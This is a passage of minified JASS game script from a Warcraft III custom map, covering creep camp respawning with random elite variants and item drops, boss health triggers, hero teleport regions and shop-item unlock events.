set RG[L9]=RG[RH]
set RE[L9]=RE[RH]
set RF[L9]=RF[RH]
set RH=RH-1
endfunction
function B1T takes nothing returns integer
set RH=RH+1
set RD[RH]=CreateTimer()
set RG[RH]=-1
set RE[RH]=-1
set RF[RH]=-1
return RH
endfunction
function B1U takes integer Na returns integer
local integer L9=0
local integer c0=-1
local integer array iS
local integer iR=Ql[Na]
loop
exitwhen L9>QY
if Ql[L9]>=iR-QS and Ql[L9]<=iR+QS and L9!=Qm[Na] and Qy[L9]==-1 then
set c0=c0+1
set iS[c0]=L9
endif
set L9=L9+1
endloop
if c0==-1 then
return -1
endif
return iS[GetRandomInt(0,c0)]
endfunction
function B1V takes unit Hu,integer iK returns nothing
local integer iB=RN[iK]
local integer iM=RO[iK]
local integer L9=0
local integer V9=0
local real iL=0.
local real NT=0.
local item OU
local boolean iE=false
loop
exitwhen iE
set iE=true
set iL=GetRandomReal(0.,100.)
set NT=0.
set L9=iB
loop
exitwhen L9>iB+iM
if RM[L9]==V9 then
if iL>NT and iL<=NT+RL[L9] then
set OU=CreateItem(RK[L9],GetUnitX(Hu),GetUnitY(Hu))
endif
set NT=RL[L9]
set iE=false
endif
set L9=L9+1
endloop
set V9=V9+1
endloop
set OU=null
endfunction
function B1W takes nothing returns nothing
endfunction
function B1X takes nothing returns nothing
set Qe=false
set Qd=true
set Qp=true
set h6[0]=Player(PLAYER_NEUTRAL_AGGRESSIVE)
set QV=450.
set QW=50.
set QT=2.
set QU=2.
set Qc="Abilities\\Spells\\Other\\ANsa\\ANsaTarget.mdl"
set QX=true
set Qo=true
set Qa=500.
set Qb=6.
set QQ=false
set QR=75
set QS=1
set Qg=true
set Qj=1
endfunction
function B1Y takes nothing returns nothing
endfunction
function B1Z takes nothing returns nothing
endfunction
function B1a takes nothing returns nothing
endfunction
function B1b takes nothing returns nothing
endfunction
function B1c takes player Ht returns boolean
return Ht==h6[0] or Ht==h6[1] or Ht==h6[2] or Ht==h6[3] or Ht==h6[4] or Ht==h6[5] or Ht==h6[6] or Ht==h6[7] or Ht==h6[8] or Ht==h6[9] or Ht==h6[10] or Ht==h6[11] or Ht==h6[12] or Ht==h6[13] or Ht==h6[14] or Ht==h6[15]
endfunction
function B1d takes nothing returns boolean
return B1O(GetTriggerUnit())!=-1
endfunction
function B1e takes nothing returns boolean
return B1c(GetOwningPlayer(GetFilterUnit()))
endfunction
function B1f takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER and GetWidgetLife(GetFilterUnit())>0.
endfunction
function B1g takes nothing returns boolean
local integer iC
local integer iD
if IsUnitType(GetFilterUnit(),UNIT_TYPE_STRUCTURE)==false and B1c(GetOwningPlayer(GetFilterUnit())) and B1P(GetFilterUnit())==-1 then
set iC=B1L(GetFilterUnit())
set iD=B1M(GetUnitTypeId(GetFilterUnit()))
return Q7[iC]==-1 or iC==-1 and Q2[iD]==-1 or iD==-1
endif
return false
endfunction
function B1h takes integer L9 returns nothing
call PauseUnit(h7[Qh[L9]],false)
call SetUnitInvulnerable(h7[Qh[L9]],false)
set Qh[L9]=Qh[Qi]
set Qf[L9]=Qf[Qi]
set Qi=Qi-1
if Qi==-1 then
call DestroyTimer(Qk)
endif
endfunction
function B1i takes nothing returns nothing
local integer L9=0
loop
set Qf[L9]=Qf[L9]+Qj
if Qf[L9]>=240 then
call B1h(L9)
set L9=L9-1
endif
set L9=L9+1
exitwhen L9>Qi
endloop
endfunction
function B1j takes nothing returns nothing
local integer iH=B1Q(GetExpiredTimer())
local integer iN=-1
local integer L9=0
local integer PC=0
local integer PB=-1
local group Na
local boolexpr iF
local boolean iX=true
local boolean array iW
local integer array iO
local player Ht
local real Hb
local real MD
local real ME
local real Vx
local integer iY=0
set iW[0]=true
set iW[1]=true
set iW[2]=true
if RG[iH]==0 then
set iN=RE[iH]
set L9=0
loop
if Qs[L9]==iN then
set PB=PB+1
set iO[PB]=L9
endif
set L9=L9+1
exitwhen L9>Qu
endloop
elseif RG[iH]==1 then
set PB=0
set iO[PB]=RE[iH]
endif
if QX and Q0[iN]==false then
if Qa>0. then
set Na=CreateGroup()
set iF=Filter(function B1f)
endif
set L9=0
loop
if Qa>0. then
call GroupEnumUnitsInRange(Na,Qw[iO[L9]],Qx[iO[L9]],Qa,iF)
if FirstOfGroup(Na)!=null then
set iW[0]=false
endif
endif
if Qo then
set PC=0
loop
set Ht=Player(PC)
if GetPlayerController(Ht)==MAP_CONTROL_USER then
if Qo and iW[1] then
if IsVisibleToPlayer(Qw[iO[L9]],Qx[iO[L9]],Ht) then
set iW[1]=false
endif
endif
endif
set PC=PC+1
exitwhen PC>11
endloop
endif
set L9=L9+1
exitwhen L9>PB
endloop
set iX=iW[0] and iW[1] and iW[2]
if Qa>0. then
call DestroyGroup(Na)
call DestroyBoolExpr(iF)
set Na=null
set iF=null
endif
endif
if iX then
set L9=0
loop
if Qt[iO[L9]]!=0 then
set MD=Qw[iO[L9]]
set ME=Qx[iO[L9]]
set Vx=Qr[iO[L9]]
if RG[iH]==1 and QU>0. then
set Hb=GetRandomReal(0.,QU)
set Vx=GetRandomReal(0.,360.)
set MD=MD+Hb*Cos(bj_DEGTORAD*Vx)
set ME=ME+Hb*Sin(bj_DEGTORAD*Vx)
set Vx=GetRandomReal(0.,360.)
endif
set h7[iO[L9]]=CreateUnit(Player(Qv[iO[L9]]),Qt[iO[L9]],MD,ME,GetRandomReal(0.,360.))
set iY=GetRandomInt(1,100)
if iY==1 then
call SetUnitVertexColor(h7[iO[L9]],10,10,10,180)
call AddSpecialEffectTarget("Abilities\\Weapons\\AvengerMissile\\AvengerMissile.mdl",h7[iO[L9]],"overhead")
call AddSpecialEffectTarget("Abilities\\Weapons\\AvengerMissile\\AvengerMissile.mdl",h7[iO[L9]],"chest")
call AddSpecialEffectTarget("Abilities\\Weapons\\AvengerMissile\\AvengerMissile.mdl",h7[iO[L9]],"origin")
call AddSpecialEffectTarget("Abilities\\Weapons\\AvengerMissile\\AvengerMissile.mdl",h7[iO[L9]],"weapon")
call UnitAddAbility(h7[iO[L9]],$41436168)
elseif iY==2 then
call SetUnitVertexColor(h7[iO[L9]],255,0,0,170)
call AddSpecialEffectTarget("Abilities\\Weapons\\PhoenixMissile\\Phoenix_Missile_mini.mdl",h7[iO[L9]],"overhead")
call AddSpecialEffectTarget("Abilities\\Weapons\\PhoenixMissile\\Phoenix_Missile_mini.mdl",h7[iO[L9]],"chest")
call AddSpecialEffectTarget("Abilities\\Weapons\\PhoenixMissile\\Phoenix_Missile_mini.mdl",h7[iO[L9]],"origin")
call AddSpecialEffectTarget("Abilities\\Weapons\\PhoenixMissile\\Phoenix_Missile_mini.mdl",h7[iO[L9]],"weapon")
call UnitAddAbility(h7[iO[L9]],$41305159)
elseif iY==3 then
call SetUnitVertexColor(h7[iO[L9]],255,255,0,180)
call AddSpecialEffectTarget("Objects\\InventoryItems\\PotofGold\\PotofGold.mdl",h7[iO[L9]],"overhead")
call UnitAddAbility(h7[iO[L9]],$41305858)
elseif iY==4 then
call SetUnitVertexColor(h7[iO[L9]],255,50,50,120)
call AddSpecialEffectTarget("Abilities\\Weapons\\SpiritOfVengeanceMissile\\SpiritOfVengeanceMissile.mdl",h7[iO[L9]],"overhead")
call AddSpecialEffectTarget("Abilities\\Weapons\\SpiritOfVengeanceMissile\\SpiritOfVengeanceMissile.mdl",h7[iO[L9]],"chest")
call AddSpecialEffectTarget("Abilities\\Weapons\\SpiritOfVengeanceMissile\\SpiritOfVengeanceMissile.mdl",h7[iO[L9]],"origin")
call AddSpecialEffectTarget("Abilities\\Weapons\\SpiritOfVengeanceMissile\\SpiritOfVengeanceMissile.mdl",h7[iO[L9]],"weapon")
call UnitAddAbility(h7[iO[L9]],$41305859)
elseif iY==5 then
call SetUnitVertexColor(h7[iO[L9]],0,0,255,200)
call AddSpecialEffectTarget("war3mapImported\\EmpathicBond.mdx",h7[iO[L9]],"chest")
call UnitAddAbility(h7[iO[L9]],$41436D33)
endif
if Qc!="" then
call DestroyEffect(AddSpecialEffectTarget(Qc,h7[iO[L9]],"origin"))
endif
if Qg then
call PauseUnit(h7[iO[L9]],true)
call SetUnitInvulnerable(h7[iO[L9]],true)
if Qi==-1 then
set Qk=CreateTimer()
call TimerStart(Qk,.04,true,function B1i)
endif
set Qi=Qi+1
set Qh[Qi]=iO[L9]
set Qf[Qi]=0.
endif
if RF[iH]!=-1 then
set h8[RF[iH]]=h7[iO[L9]]
endif
endif
set L9=L9+1
exitwhen L9>PB
endloop
call B1S(iH)
else
call TimerStart(RD[iH],Qb,false,function B1j)
endif
set Ht=null
set Na=null
endfunction
function B1k takes nothing returns nothing
local unit Hc=GetTriggerUnit()
local integer iB=B1O(Hc)
local integer iN=-1
local integer iQ
local real MD
local real ME
local real Vx
local integer L9=0
local integer PC=0
local integer PB=-1
local integer iT=0
local real iU=-1.
local boolean iE=false
local integer array iO
local boolean iP=true
local integer iC=B1L(Hc)
local integer iD=B1M(GetUnitTypeId(Hc))
local integer iH=B1T()
local integer iI
local integer iJ
if iC==-1 then
set iI=-1
else
set iI=Q7[iC]
endif
if iD==-1 then
set iJ=-1
else
set iJ=Q2[iD]
endif
if iC>-1 and RC[iC]>-1 then
call B1V(Hc,RC[iC])
endif
if iD>-1 and Q6[iD]>-1 then
call B1V(Hc,Q6[iD])
endif
if Qp==false and iI==-1 and iJ==-1 then
set h7[iB]=null
set iN=Qs[iB]
set RG[iH]=0
set RE[iH]=iN
set L9=0
loop
if Qs[L9]==iN then
set PB=PB+1
set iO[PB]=L9
if iP and GetWidgetLife(h7[L9])>0. then
set iP=false
endif
endif
set L9=L9+1
exitwhen L9>Qu
endloop
if iB!=-1 and iP then
set iQ=B1U(iN)
if QQ and GetRandomInt(1,100)<=QR and iQ!=-1 and Qy[iN]!=1 then
set Qm[iN]=iQ
set L9=0
set PC=0
set iT=Qu
loop
if L9==0 then
set MD=Qw[iO[PC]]
set ME=Qx[iO[PC]]
set Vx=Qr[iO[PC]]
set L9=1
endif
set h7[iO[PC]]=null
set Qt[iO[PC]]=0
set PC=PC+1
exitwhen PC>PB
endloop
set L9=0
set PC=-1
loop
exitwhen L9>iT
if Qs[L9]==iQ and Qq[L9]!=0 then
set iE=false
loop
exitwhen iE or PC>=PB
set PC=PC+1
set iE=true
endloop
if iE then
set Qt[iO[PC]]=Qq[L9]
else
call B1R(null)
set Qt[Qu]=Qq[L9]
set Qs[Qu]=iN
set Qw[Qu]=MD+GetRandomReal(-50.,50.)
set Qx[Qu]=ME+GetRandomReal(-50.,50.)
set Qr[Qu]=Vx
set Qv[Qu]=Qv[L9]
set PB=PB+1
set iO[PB]=Qu
set PC=PB
endif
endif
set L9=L9+1
endloop
endif
set L9=0
loop
set PC=B1M(Qt[L9])
if PC!=-1 then
set iU=Q4[PC]
endif
set L9=L9+1
exitwhen L9>PB or iU!=-1.
endloop
if Qz[Qm[iN]]!=-1. then
set iU=Qz[Qm[iN]]
endif
endif
elseif (Qp and iI!=0 and iJ!=0) or iI==1 or iJ==1 then
set RG[iH]=1
set RF[iH]=iC
set RE[iH]=iB
if iC!=-1 and Q9[iC]!=-1. then
set iU=Q9[iC]
endif
if iU==-1. and iD!=-1 and Q4[iD]!=-1. then
set iU=Q4[iD]
endif
endif
if iI!=0 and iJ!=0 and iN==-1 or Qy[iN]!=0 and iP then
if iU==-1. then
set iU=QW
endif
set iU=RAbsBJ(iU+GetRandomReal(-QT,QT))
call TimerStart(RD[iH],iU,false,function B1j)
else
call B1S(iH)
endif
set Hc=null
endfunction
function B1l takes nothing returns nothing
local unit Vk=GetEnumUnit()
local integer iB=B1O(Vk)
if iB==-1 then
call B1R(Vk)
set iB=Qu
endif
set Qs[iB]=QZ
set Ql[QZ]=Ql[QZ]+GetUnitLevel(Vk)
set Qn[QZ]=Qn[QZ]+1
set Vk=null
endfunction
function B1m takes nothing returns nothing
local unit Vk=GetEnumUnit()
local integer iB=B1O(Vk)
local texttag NX
local group Na
local boolexpr iF
local integer iC
local integer iD
local boolean iE
if iB==-1 then
set iC=B1L(Vk)
set iD=B1M(GetUnitTypeId(Vk))
set iE=Q7[iC]==-1 or iC==-1 and Q2[iD]==-1 or iD==-1
if Qp==false and B1P(Vk)==-1 and iE then
set Na=CreateGroup()
set iF=Filter(function B1g)
set QY=QY+1
set Qy[QY]=-1
set Qz[QY]=-1.
if Qe then
set NX=CreateTextTag()
call SetTextTagText(NX,"Creep camp "+I2S(QY),.03)
call SetTextTagColor(NX,255,0,0,255)
call SetTextTagPos(NX,GetUnitX(Vk)-50.,GetUnitY(Vk),10.)
endif
set Qm[QY]=QY
call GroupEnumUnitsInRange(Na,GetUnitX(Vk),GetUnitY(Vk),QV,iF)
set QZ=QY
call ForGroup(Na,function B1l)
call DestroyGroup(Na)
call DestroyBoolExpr(iF)
set Na=null
set iF=null
elseif Qp or Q7[iC]==1 or Q2[iD]==1 then
call B1R(Vk)
endif
endif
set Vk=null
endfunction
function B1n takes nothing returns nothing
local group Na=CreateGroup()
if Qd then
call GroupEnumUnitsInRect(Na,GetPlayableMapRect(),Filter(function B1e))
call ForGroup(Na,function B1m)
if Qe then
call BJDebugMsg("NCSS report:\nTotal creeps: "+I2S(Qu+1)+"\nTotal groups: "+I2S(QY+1))
endif
endif
call B1a()
call DestroyGroup(Na)
set Na=null
endfunction
function B1o takes nothing returns nothing
local trigger iG=CreateTrigger()
local integer L9=0
set QY=-1
set Qu=-1
set Qi=-1
set RH=-1
call TriggerAddAction(iG,function B1k)
call TriggerAddCondition(iG,Condition(function B1d))
loop
call TriggerRegisterPlayerUnitEvent(iG,Player(L9),EVENT_PLAYER_UNIT_DEATH,null)
set L9=L9+1
exitwhen L9>15
endloop
set iG=null
endfunction
function B1p takes nothing returns nothing
set h9=CreateTrigger()
call TriggerRegisterTimerEventSingle(h9,0.)
call TriggerAddAction(h9,function B1n)
set Q8=-1
set Q3=-1
set RI=-1
set RJ=-1
call B1X()
call B1o()
call B1Y()
call B1Z()
endfunction
function B1q takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(20.)
call SetUnitVertexColorBJ(Kz,100,0.,0.,0)
call EnableTrigger(ia)
call TriggerSleepAction(10.)
call DisableTrigger(ia)
call SetUnitVertexColorBJ(Kz,100,100.,100.,0)
call TriggerSleepAction(10.)
call EnableTrigger(GetTriggeringTrigger())
endfunction
function B1r takes nothing returns nothing
set iZ=CreateTrigger()
call TriggerRegisterUnitEvent(iZ,Kz,EVENT_UNIT_DAMAGED)
call TriggerAddAction(iZ,function B1q)
endfunction
function B1s takes nothing returns nothing
call SetUnitLifeBJ(Kz,GetUnitStateSwap(UNIT_STATE_LIFE,Kz)+GetUnitStateSwap(UNIT_STATE_MAX_LIFE,Kz)*.05)
endfunction
function B1t takes nothing returns nothing
set ia=CreateTrigger()
call DisableTrigger(ia)
call TriggerRegisterUnitEvent(ia,Kz,EVENT_UNIT_DAMAGED)
call TriggerAddAction(ia,function B1s)
endfunction
function B1u takes nothing returns boolean
if not (IsUnitAliveBJ(LV)==true) then
return false
endif
return true
endfunction
function B1v takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call CreateTextTagUnitBJ("|c00ff000020|r",LV,0,20.,100,0.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),1.)
call TriggerSleepAction(1.)
call CreateTextTagUnitBJ("|c00ff000019|r",LV,0,20.,100,0.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),1.)
call TriggerSleepAction(1.)
call CreateTextTagUnitBJ("|c00ff000018|r",LV,0,20.,100,0.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),1.)
call TriggerSleepAction(1.)
call CreateTextTagUnitBJ("|c00ff000017|r",LV,0,20.,100,0.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),1.)
call TriggerSleepAction(1.)
call CreateTextTagUnitBJ("|c00ff000016|r",LV,0,20.,100,0.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),1.)
call TriggerSleepAction(1.)
call CreateTextTagUnitBJ("|c00ff000015|r",LV,0,20.,100,0.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),1.)
call TriggerSleepAction(1.)
call CreateTextTagUnitBJ("|c00ff000014|r",LV,0,20.,100,0.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),1.)
call TriggerSleepAction(1.)
call CreateTextTagUnitBJ("|c00ff000013|r",LV,0,20.,100,0.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),1.)
call TriggerSleepAction(1.)
call CreateTextTagUnitBJ("|c00ff000012|r",LV,0,20.,100,0.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),1.)
call TriggerSleepAction(1.)
call CreateTextTagUnitBJ("|c00ff000011|r",LV,0,20.,100,0.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),1.)
call TriggerSleepAction(1.)
call CreateTextTagUnitBJ("|c00ff000010|r",LV,0,20.,100,0.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),1.)
call TriggerSleepAction(1.)
call CreateTextTagUnitBJ("|c00ff00009|r",LV,0,20.,100,0.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),1.)
call TriggerSleepAction(1.)
call CreateTextTagUnitBJ("|c00ff00008|r",LV,0,20.,100,0.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),1.)
call TriggerSleepAction(1.)
call CreateTextTagUnitBJ("|c00ff00007|r",LV,0,20.,100,0.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),1.)
call TriggerSleepAction(1.)
call CreateTextTagUnitBJ("|c00ff00006|r",LV,0,20.,100,0.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),1.)
call TriggerSleepAction(1.)
call CreateTextTagUnitBJ("|c00ff00005|r",LV,0,20.,100,0.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),1.)
call TriggerSleepAction(1.)
call CreateTextTagUnitBJ("|c00ff00004|r",LV,0,20.,100,0.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),1.)
call TriggerSleepAction(1.)
call CreateTextTagUnitBJ("|c00ff00003|r",LV,0,20.,100,0.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),1.)
call TriggerSleepAction(1.)
call CreateTextTagUnitBJ("|c00ff00002|r",LV,0,20.,100,0.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),1.)
call TriggerSleepAction(1.)
call CreateTextTagUnitBJ("|c00ff00001|r",LV,0,20.,100,0.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),1.)
call TriggerSleepAction(1.)
if B1u() then
call SetUnitLifePercentBJ(LV,100)
call EnableTrigger(GetTriggeringTrigger())
else
endif
endfunction
function B1w takes nothing returns nothing
set ib=CreateTrigger()
call TriggerRegisterUnitLifeEvent(ib,LV,LESS_THAN,60000.)
call TriggerAddAction(ib,function B1v)
endfunction
function B1x takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function B1y takes nothing returns nothing
set Ub=GetRectCenter(GR)
call SetUnitPositionLoc(GetTriggerUnit(),Ub)
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),Ub,0)
call RemoveLocation(Ub)
endfunction
function B1z takes nothing returns nothing
set Uk=CreateTrigger()
call DisableTrigger(Uk)
call TriggerRegisterEnterRectSimple(Uk,CV)
call TriggerAddCondition(Uk,Condition(function B1x))
call TriggerAddAction(Uk,function B1y)
endfunction
function B10 takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function B11 takes nothing returns nothing
set Ub=GetRectCenter(GR)
call SetUnitPositionLoc(GetTriggerUnit(),Ub)
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),Ub,0)
call RemoveLocation(Ub)
endfunction
function B12 takes nothing returns nothing
set Uj=CreateTrigger()
call DisableTrigger(Uj)
call TriggerRegisterEnterRectSimple(Uj,BF)
call TriggerAddCondition(Uj,Condition(function B10))
call TriggerAddAction(Uj,function B11)
endfunction
function B13 takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function B14 takes nothing returns nothing
set Ub=GetRectCenter(GR)
call SetUnitPositionLoc(GetTriggerUnit(),Ub)
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),Ub,0)
call RemoveLocation(Ub)
endfunction
function B15 takes nothing returns nothing
set Ui=CreateTrigger()
call DisableTrigger(Ui)
call TriggerRegisterEnterRectSimple(Ui,Cb)
call TriggerAddCondition(Ui,Condition(function B13))
call TriggerAddAction(Ui,function B14)
endfunction
function B16 takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function B17 takes nothing returns nothing
set Ub=GetRectCenter(GR)
call SetUnitPositionLoc(GetTriggerUnit(),Ub)
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),Ub,0)
call RemoveLocation(Ub)
endfunction
function B18 takes nothing returns nothing
set Up=CreateTrigger()
call DisableTrigger(Up)
call TriggerRegisterEnterRectSimple(Up,Cc)
call TriggerAddCondition(Up,Condition(function B16))
call TriggerAddAction(Up,function B17)
endfunction
function B19 takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function B2B takes nothing returns nothing
set Ub=GetRectCenter(GR)
call SetUnitPositionLoc(GetTriggerUnit(),Ub)
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),Ub,0)
call RemoveLocation(Ub)
endfunction
function B2C takes nothing returns nothing
set Uo=CreateTrigger()
call DisableTrigger(Uo)
call TriggerRegisterEnterRectSimple(Uo,Cu)
call TriggerAddCondition(Uo,Condition(function B19))
call TriggerAddAction(Uo,function B2B)
endfunction
function B2D takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function B2E takes nothing returns nothing
set Ub=GetRectCenter(GR)
call SetUnitPositionLoc(GetTriggerUnit(),Ub)
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),Ub,0)
call RemoveLocation(Ub)
endfunction
function B2F takes nothing returns nothing
set Um=CreateTrigger()
call DisableTrigger(Um)
call TriggerRegisterEnterRectSimple(Um,FY)
call TriggerAddCondition(Um,Condition(function B2D))
call TriggerAddAction(Um,function B2E)
endfunction
function B2G takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function B2H takes nothing returns nothing
set Ub=GetRectCenter(GR)
call SetUnitPositionLoc(GetTriggerUnit(),Ub)
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),Ub,0)
call RemoveLocation(Ub)
endfunction
function B2I takes nothing returns nothing
set Ul=CreateTrigger()
call DisableTrigger(Ul)
call TriggerRegisterEnterRectSimple(Ul,Fa)
call TriggerAddCondition(Ul,Condition(function B2G))
call TriggerAddAction(Ul,function B2H)
endfunction
function B2J takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49304139) then
return false
endif
return true
endfunction
function B2K takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49303037) then
return false
endif
return true
endfunction
function B2L takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49303038) then
return false
endif
return true
endfunction
function B2M takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$4930325A) then
return false
endif
return true
endfunction
function B2N takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49304238) then
return false
endif
return true
endfunction
function B2O takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49305236) then
return false
endif
return true
endfunction
function B2P takes nothing returns boolean
if not (GetItemTypeId(GetSoldItem())==$49305237) then
return false
endif
return true
endfunction
function B2Q takes nothing returns nothing
if B2J() then
call RemoveUnit(H8)
call SetUnitInvulnerable(Ky,false)
call PauseUnitBJ(false,Ky)
call SetUnitOwner(Ky,Player(11),true)
else
endif
if B2K() then
call RemoveUnit(H3)
call SetUnitInvulnerable(Ld,false)
call ShowUnitShow(Ld)
call PauseUnitBJ(false,Ld)
call SetUnitOwner(Ld,Player(11),true)
else
endif
if B2L() then
call RemoveUnit(IC)
call SetUnitInvulnerable(LT,false)
call ShowUnitShow(LT)
call PauseUnitBJ(false,LT)
call SetUnitOwner(LT,Player(11),true)
else
endif
if B2M() then
call RemoveUnit(IG)
call SetUnitInvulnerable(LV,false)
call ShowUnitShow(LV)
call PauseUnitBJ(false,LV)
call SetUnitOwner(LV,Player(11),true)
else
endif
if B2N() then
call RemoveUnit(Hv)
call SetUnitInvulnerable(Kz,false)
call PauseUnitBJ(false,Kz)
else
endif
if B2O() then
call RemoveUnit(GetSellingUnit())
call SetUnitInvulnerable(LE,false)
call PauseUnitBJ(false,LE)
set Tt[2]=75.
call CreateFogModifierRectBJ(true,Player(0),FOG_OF_WAR_VISIBLE,FZ)
else
endif
if B2P() then
call RemoveUnit(GetSellingUnit())
call SetUnitInvulnerable(LF,false)
call PauseUnitBJ(false,LF)
set Tt[0]=75.
call CreateFogModifierRectBJ(true,Player(0),FOG_OF_WAR_VISIBLE,Fd)
else
endif
endfunction
function B2R takes nothing returns nothing
set ic=CreateTrigger()
